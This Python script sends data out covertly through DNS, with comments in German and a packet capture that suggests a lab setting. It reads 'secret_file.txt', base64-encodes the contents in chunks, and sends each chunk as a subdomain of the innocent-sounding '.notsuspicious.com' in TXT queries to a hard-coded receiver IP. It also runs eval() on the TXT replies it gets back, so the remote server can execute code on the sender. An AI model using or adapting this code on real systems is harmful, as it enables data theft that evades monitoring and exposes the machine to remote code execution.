import base64
import hashlib
import socket
import threading
from itertools import count
from time import sleep
from scapy.all import *
import dns.message
import dns.query
import dns.rrset
import dns.rdatatype
import dns.rdataclass
import dns.rdata
from scapy.layers.dns import DNS
from scapy.layers.inet import IP
from scapy.sendrecv import sniff
from scapy.utils import wrpcap


def read_file(filename):
    secret_file = open(filename,"r")
    return str(secret_file.read())


def dns_compose(text):
    return base64.b64encode(text.encode('utf-8')).decode('utf-8')


def hash_string(input_string):
    # Erstelle ein SHA-256 Hash-Objekt
    sha256_hash = hashlib.sha256()

    # Füge den String dem Hash-Objekt hinzu (muss zuerst in Bytes umgewandelt werden)
    sha256_hash.update(input_string.encode('utf-8'))

    # Gib den Hash als hexadezimale Darstellung zurück
    return sha256_hash.hexdigest()

def send_minimal_dns_request(server_ip, domain :str, port):
    # Stelle sicher, dass der Domainname absolut ist
    if not domain.endswith('.'):
        domain += '.'

    request = dns.message.make_query(domain, dns.rdatatype.TXT)

    additional_data = dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.TXT, hash_string(domain))

    # Resource Record Set (RRSet) für Additional Section
    rrset = dns.rrset.from_rdata(dns.name.from_text(domain), 300, additional_data)
    request.additional.append(rrset)

    request_bytes = request.to_wire()
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(request_bytes, (server_ip, port))
        try:
            response_bytes, addr = sock.recvfrom(512)
            response = dns.message.from_wire(response_bytes)  # Konvertiere die Antwort in ein lesbares DNS-Format
            a =  eval(print_records(response, dns.rdatatype.TXT))
            return a
        except socket.timeout:
            print("No response received (Timeout)")

def print_records(response, record_type):
    records = []

    for answer in response.answer:
        if answer.rdtype == record_type:
            for item in answer.items:
                if record_type == dns.rdatatype.A:
                    records.append(item.address)
                elif record_type == dns.rdatatype.TXT:
                    records.append(b''.join(item.strings).decode())
                elif record_type == dns.rdatatype.MX:
                    records.append(f"Priority: {item.preference}, Mail Exchange: {item.exchange}")

    if records:
        for record in records:
                return record
    else:
        print(f"No {dns.rdatatype.to_text(record_type)} records found.")
    return False

def pcap_writer():
    def sniff_and_write():
        packets = sniff(iface="eth0", filter="udp and port 53", timeout=8)
        wrpcap("send_data.pcap", packets)
        packets = rdpcap("send_data.pcap")
        with open("packet_details.txt", "w") as file:
            for packet in packets:
                file.write(packet.show(dump=True) + "\n")
    thread = threading.Thread(target=sniff_and_write)
    thread.start()



if __name__ == "__main__":
    receiver_ip = "172.36.0.3"
    port = 53
    domain_base = ".notsuspicious.com"
    print(f"Minimal DNS request sent to {receiver_ip}:{port}")
    secret_text = read_file("secret_file.txt")
    size = 30
    number_of_packages = ((size-1)+len(secret_text))//size
    pcap_writer()
    sleep(3)
    for i in range(0,number_of_packages):
        resp = True
        while resp:
            if len(secret_text)>=size*(i):
                current_domain = dns_compose(secret_text[i*size:(i+1)*size])
            elif len(secret_text)>=size*(i+1):
                current_domain = dns_compose(secret_text[i*size:-1])
            else:
                print("ERROR:Index went past Domain Name length")
                break
            current_domain += "."+ str(number_of_packages - i -1)+domain_base
            print(current_domain)
            print(f"Sending DNS request {i}")
            resp = send_minimal_dns_request(receiver_ip, str(current_domain), port)
